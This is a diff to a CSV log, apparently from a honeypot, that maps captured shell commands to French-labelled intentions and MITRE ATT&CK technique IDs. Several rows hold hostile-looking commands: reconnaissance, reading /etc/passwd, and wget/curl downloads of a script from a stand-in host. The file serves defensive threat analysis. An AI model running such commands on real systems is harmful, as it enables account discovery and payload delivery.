@@ -1,7 +1,12 @@
 session,src_ip,timestamp,input,intention,technique
+276abbb303b7,172.20.10.5,2026-11-24 16:51:59.273464+00:00,uname -a,Reconnaissance système,T1082
+276abbb303b7,172.20.10.5,2026-11-24 16:52:12.005913+00:00,cat /etc/passwd,Découverte de comptes,T1087.001
+276abbb303b7,172.20.10.5,2026-11-24 16:52:32.173668+00:00,ps aux,Découverte de processus,T1057
+276abbb303b7,172.20.10.5,2026-11-24 16:52:57.873459+00:00,wget http://example.com/test.sh,Téléchargement de charge,T1105
+276abbb303b7,172.20.10.5,2026-11-24 16:53:15.898873+00:00,curl  http://example.com/test.sh,Téléchargement de charge,T1105
+6fb29b608a96,172.20.10.5,2026-11-24 17:07:02.634218+00:00,whoami,Découverte utilisateur,T1033
 d7d772f6dbe3,192.168.56.1,2026-11-11 23:34:32.662189+00:00,uname -a,Reconnaissance système,T1082
 d7d772f6dbe3,192.168.56.1,2026-11-11 23:34:41.681012+00:00,cat /etc/passwd,Découverte de comptes,T1087.001
-30273a7336e4,192.168.56.1,2026-11-11 23:49:14.660981+00:00,ssh -p 22022 alae@192.168.56.102,Exécution de script,T1059.004
 e5fab6f430ff,192.168.56.1,2026-11-12 00:16:12.052119+00:00,uname -a,Reconnaissance système,T1082
 21a832e4f778,172.20.10.2,2026-11-18 12:34:24.335643+00:00,uname -a,Reconnaissance système,T1082
 21a832e4f778,172.20.10.2,2026-11-18 12:34:43.996851+00:00,cat /etc/password,Découverte de comptes,T1087.001
